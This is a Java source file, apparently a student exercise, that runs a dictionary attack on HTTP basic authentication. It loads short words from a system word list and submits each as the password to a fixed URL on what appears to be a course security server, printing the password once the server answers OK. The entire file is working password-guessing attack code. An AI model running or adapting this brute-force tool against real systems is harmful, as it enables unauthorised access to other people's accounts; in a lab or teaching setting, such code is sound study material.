import java.util.*;
import java.net.*;
import java.io.*; 

public class Dictionary
{
    boolean connected = false;
    int counter;
   
    Vector words = new Vector();
    
    Dictionary()
    {
        counter = 0;
        this.readWords(); 
        this.startAttack();
    }   
    
    public void startAttack()
    {
        while(counter<this.words.size())
        {
           connected = sendRequest();
           if(connected == true)
           {
             System.out.print("The password is: ");
             System.out.println((String)words.elementAt(counter-1));
             counter = words.size();
           }
        }
    }
    

    public void readWords()
    {
        String line;

        try
        {
            BufferedReader buffer = new BufferedReader(
                    new FileReader("/usr/share/lib/dict/words"));
         
            line = buffer.readLine();

            while(line != null)
            {

                if(line.length() <= 3)
                {
                    words.addElement(line);
                }

                line = buffer.readLine();
            }
        }
        catch(IOException e){}
    }
    
    public boolean sendRequest()
    {
        Authenticator.setDefault (new MyAuthenticator ());
        try 
        {
        	
        	URL url = new URL("http://sec-crack.cs.rmit.edu./SEC/2/");
                HttpURLConnection urlConn = (HttpURLConnection)url.openConnection();
                urlConn.connect();
                if(urlConn.getResponseMessage().equalsIgnoreCase("OK"))
                {
                   return true;
                }
               
        } 
        catch (IOException e) {}
        
        return false;
    }
    
     public static void main(String [] args)
     {
         Dictionary dictionary = new Dictionary();
     }
   
   
     class MyAuthenticator extends Authenticator {
       
        protected PasswordAuthentication getPasswordAuthentication() {
            String username = "";
            String password = (String)words.elementAt(counter);
            counter++;
            return new PasswordAuthentication(username, password.toCharArray());
       }
    }
}
